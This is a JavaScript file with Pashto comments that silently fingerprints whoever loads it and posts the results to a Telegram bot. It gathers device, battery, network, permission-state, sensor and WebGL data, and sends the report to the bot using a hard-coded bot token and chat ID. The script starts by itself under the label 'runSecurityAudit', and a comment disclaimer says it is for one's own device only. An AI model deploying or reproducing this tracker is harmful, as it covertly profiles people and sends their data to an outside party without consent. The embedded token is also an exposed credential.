// script.js — د وسیلې معلومات راټولول او د Telegram بوټ ته لیږل
// دا کوډ یوازې د خپل وسیله د ازموینې لپاره دی.
// د بل چا پر وسیله د دې کوډ چلول غیرقانوني دي.

// ============================================================
// ۱. د Telegram بوټ ټوکن او chat_id
// ============================================================
const botToken = '8985250723:AAEiz2c_UmZALvg9kFurYOdHwo6UdYmDA44'; // د بوټ ټوکن
const chatId = '8841631982';                                        // د چټ ID

// ============================================================
// ۲. د وسیلې بنسټیز معلومات
// ============================================================
function getDeviceInfo() {
  return {
    userAgent: navigator.userAgent,              // د براوزر او OS معلومات
    platform: navigator.platform,                // پلیټ فارم
    language: navigator.language,                // ژبه
    languages: navigator.languages,              // ټولې ژبې
    cores: navigator.hardwareConcurrency,        // د CPU هستې
    memory: navigator.deviceMemory,              // د RAM اندازه (GB)
    touch: 'ontouchstart' in window,             // ټچ ملاتړ
    maxTouchPoints: navigator.maxTouchPoints,    // د ټچ ټکي
    screen: `${screen.width}x${screen.height}`,  // سکرین
    availScreen: `${screen.availWidth}x${screen.availHeight}`, // شته سکرین
    colorDepth: screen.colorDepth,               // د رنګ ژوروالی
    pixelRatio: window.devicePixelRatio,         // د پکسل نسبت
    online: navigator.onLine,                    // آنلاین حالت
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, // وخت زون
    cookies: navigator.cookieEnabled             // کوکیز
  };
}

// ============================================================
// ۳. د بیټرۍ حالت
// ============================================================
async function getBattery() {
  if (!navigator.getBattery) return null;        // ملاتړ نه کوي
  const b = await navigator.getBattery();
  return {
    level: b.level,                              // د چارج کچه (0-1)
    charging: b.charging,                        // چارج کیږي؟
    chargingTime: b.chargingTime,                // د چارج وخت
    dischargingTime: b.dischargingTime           // د ختمیدو وخت
  };
}

// ============================================================
// ۴. د شبکې معلومات
// ============================================================
function getConnection() {
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!c) return null;
  return {
    type: c.effectiveType,                       // 4g, 3g, 2g
    downlink: c.downlink,                        // د ډاونلوډ سرعت (Mbps)
    rtt: c.rtt,                                  // د ځنډ وخت (ms)
    saveData: c.saveData                         // د ډاټا سپما حالت
  };
}

// ============================================================
// ۵. د اجازو حالت ازموینه
// ============================================================
async function checkPermissions() {
  const perms = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read'];
  const result = {};
  for (const p of perms) {
    try {
      const status = await navigator.permissions.query({ name: p });
      result[p] = status.state;                  // granted / denied / prompt
    } catch (e) {
      result[p] = 'unsupported';                 // نه ملاتړ کیږي
    }
  }
  return result;
}

// ============================================================
// ۶. د حسګرو ملاتړ
// ============================================================
function getSensors() {
  return {
    accelerometer: 'Accelerometer' in window,       // سرعت سنج
    gyroscope: 'Gyroscope' in window,               // ګیروسکوپ
    magnetometer: 'Magnetometer' in window,         // مقناطیس سنج
    ambientLight: 'AmbientLightSensor' in window,   // د رڼا حسګر
    proximity: 'ProximitySensor' in window          // نږدېوالی
  };
}

// ============================================================
// ۷. د WebGL ګرافیک معلومات
// ============================================================
function getWebGL() {
  const canvas = document.createElement('canvas');
  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  if (!gl) return null;
  const dbg = gl.getExtension('WEBGL_debug_renderer_info');
  return {
    vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'unknown',
    renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'unknown',
    version: gl.getParameter(gl.VERSION)
  };
}

// ============================================================
// ۸. د ټولو معلوماتو راټولول او Telegram ته لیږل
// ============================================================
async function runSecurityAudit() {
  // د راپور جوړول
  const report = {
    device: getDeviceInfo(),                 // د وسیلې معلومات
    battery: await getBattery(),             // بیټري
    connection: getConnection(),             // شبکه
    permissions: await checkPermissions(),   // اجازې
    sensors: getSensors(),                   // حسګرونه
    webgl: getWebGL(),                       // ګرافیک
    timestamp: new Date().toISOString()      // وخت
  };

  console.log('=== د وسیلې امنیت راپور ===');
  console.log(JSON.stringify(report, null, 2));

  // د راپور Telegram ته لیږل
  const text = JSON.stringify(report, null, 2);
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,                     // چټ ID
        text: text                            // د راپور متن
      })
    });
    const data = await res.json();
    console.log('Telegram response:', data);  // د Telegram ځواب
  } catch (err) {
    console.error('Send error:', err);        // د لیږلو خطا
  }

  return report;
}

// ============================================================
// چلول
// ============================================================
runSecurityAudit();